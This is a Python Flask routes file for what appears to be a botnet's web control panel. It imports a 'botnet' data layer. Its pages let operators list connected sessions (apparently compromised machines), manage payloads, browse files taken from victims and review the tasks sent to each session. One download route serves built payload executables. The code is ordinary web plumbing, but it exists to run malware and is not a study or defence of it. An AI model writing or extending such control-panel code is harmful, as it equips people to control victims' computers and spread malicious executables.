import os

from flask import current_app, Blueprint, flash, redirect, render_template, request, url_for, send_from_directory
from flask_login import current_user, login_required

from botnet.dao import file_dao, payload_dao, session_dao
from web_gui.utils import get_sessions_serialized, get_tasks_serialized

# Blueprint
root = Blueprint('root', __name__)


# Routes
@root.route("/home")
@root.route("/")
def home():
	if current_user.is_authenticated:
		return redirect(url_for('root.sessions'))
	else:
		return redirect(url_for('users.login'))


@root.route("/dashboard")
@root.route("/sessions")
@login_required
def sessions():
	sessions = get_sessions_serialized(current_user.id)
	return render_template("sessions.html", sessions=sessions, n=len(sessions))


@root.route("/payloads")
@login_required
def payloads():
	payloads = payload_dao.get_user_payloads(current_user.id)
	return render_template("payloads.html", 
							payloads=payloads, 
							owner=current_user.username)


@root.route("/files")
@login_required
def files():
	user_files = file_dao.get_user_files(current_user.id)
	return render_template("files.html", 
							files=user_files, 
							owner=current_user.username)


@root.route("/tasks", methods=["GET"])
@login_required
def tasks():
	"""Task history for a client"""
	session_uid = request.args.get('session_uid')

	# get serialized task history from database
	tasks = get_tasks_serialized(session_uid)

	# show task history as a table
	return render_template("tasks.html", 
							tasks=tasks, 
							session_uid=session_uid,
							title="Tasks")


#####################
#
# DOWNLOADS
#
#####################

@root.route("/executables/<user>/exe/<filename>")
@login_required
def download_payload(user, filename):	
	return send_from_directory(os.path.join(current_app.config['OUTPUT_DIR'], user, 'exe'), filename, as_attachment=True)
